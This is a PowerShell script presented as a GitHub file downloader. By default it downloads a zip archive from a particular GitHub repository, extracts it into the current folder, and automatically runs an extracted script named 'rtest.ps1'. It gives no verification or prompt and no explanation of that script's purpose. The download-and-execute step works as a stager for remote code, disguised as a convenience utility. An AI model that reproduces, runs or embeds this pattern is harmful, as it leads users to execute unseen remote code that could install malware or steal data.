param(
    [string]$Url = 'https://github.com/kower6766/aione/raw/refs/heads/main/test0.zip',
    [string]$OutFile = '.\test0.zip',
    [switch]$Force
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

function Convert-GitHubUrlToRawUrl {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Url
    )

    $uri = [System.Uri]$Url

    if ($uri.Host -eq 'raw.githubusercontent.com') {
        return $Url
    }

    if ($uri.Host -ne 'github.com') {
        throw "Only github.com or raw.githubusercontent.com public file URLs are supported: $Url"
    }

    $segments = $uri.AbsolutePath.Trim('/') -split '/'
    if ($segments.Count -lt 5) {
        throw "Invalid GitHub file URL format: $Url"
    }

    $owner = $segments[0]
    $repo = $segments[1]
    $kind = $segments[2]
    $branch = $segments[3]
    $pathSegments = $segments[4..($segments.Count - 1)]

    if ($kind -ne 'blob' -and $kind -ne 'raw') {
        throw "Only GitHub file page URLs (.../blob/...) or raw URLs are supported: $Url"
    }

    $rawPath = ($pathSegments -join '/')
    return "https://raw.githubusercontent.com/$owner/$repo/$branch/$rawPath"
}

function Resolve-OutputPath {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$RawUrl,
        [string]$OutFile
    )

    if ([string]::IsNullOrWhiteSpace($OutFile)) {
        $fileName = [System.IO.Path]::GetFileName(([System.Uri]$RawUrl).AbsolutePath)
        if ([string]::IsNullOrWhiteSpace($fileName)) {
            throw "Cannot infer output file name from URL. Please specify -OutFile explicitly."
        }

        return (Join-Path -Path (Get-Location) -ChildPath $fileName)
    }

    return [System.IO.Path]::GetFullPath($OutFile)
}

function Expand-DownloadedArchiveIfNeeded {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$DownloadedFilePath
    )

    if ([System.IO.Path]::GetExtension($DownloadedFilePath) -ine '.zip') {
        return $null
    }

    $destinationPath = (Get-Location).Path
    Expand-Archive -LiteralPath $DownloadedFilePath -DestinationPath $destinationPath -Force
    return $destinationPath
}

function Invoke-DownloadedScriptIfNeeded {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$DownloadedFilePath
    )

    if ([System.IO.Path]::GetExtension($DownloadedFilePath) -ieq '.zip') {
        $extractedScriptPath = Join-Path -Path (Get-Location).Path -ChildPath 'rtest.ps1'
        if (Test-Path -LiteralPath $extractedScriptPath) {
            & $extractedScriptPath
            return $extractedScriptPath
        }

        return $null
    }

    if ([System.IO.Path]::GetFileName($DownloadedFilePath) -ine 'rtest.ps1') {
        return $null
    }

    & $DownloadedFilePath
    return $DownloadedFilePath
}

function Download-GitHubFile {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Url,
        [string]$OutFile,
        [switch]$Force
    )

    $rawUrl = Convert-GitHubUrlToRawUrl -Url $Url
    $targetPath = Resolve-OutputPath -RawUrl $rawUrl -OutFile $OutFile
    $targetDirectory = Split-Path -Path $targetPath -Parent

    if (-not [string]::IsNullOrWhiteSpace($targetDirectory) -and -not (Test-Path -LiteralPath $targetDirectory)) {
        New-Item -ItemType Directory -Path $targetDirectory -Force | Out-Null
    }

    if ((Test-Path -LiteralPath $targetPath) -and -not $Force.IsPresent) {
        throw "Target file already exists: $targetPath. Use -Force to overwrite it."
    }

    Invoke-WebRequest -Uri $rawUrl -OutFile $targetPath
    $extractedTo = Expand-DownloadedArchiveIfNeeded -DownloadedFilePath $targetPath
    $executedScript = Invoke-DownloadedScriptIfNeeded -DownloadedFilePath $targetPath

    [PSCustomObject]@{
        RawUrl = $rawUrl
        SavedTo = $targetPath
        ExtractedTo = $extractedTo
        ExecutedScript = $executedScript
    }
}

if ($MyInvocation.InvocationName -ne '.') {
    $result = Download-GitHubFile -Url $Url -OutFile $OutFile -Force:$Force
    Write-Host "Download succeeded: $($result.RawUrl)"
    Write-Host "Saved to: $($result.SavedTo)"
    if (-not [string]::IsNullOrWhiteSpace($result.ExtractedTo)) {
        Write-Host "Extracted to current directory: $($result.ExtractedTo)"
    }
    if (-not [string]::IsNullOrWhiteSpace($result.ExecutedScript)) {
        Write-Host "Executed script: $($result.ExecutedScript)"
    }
}
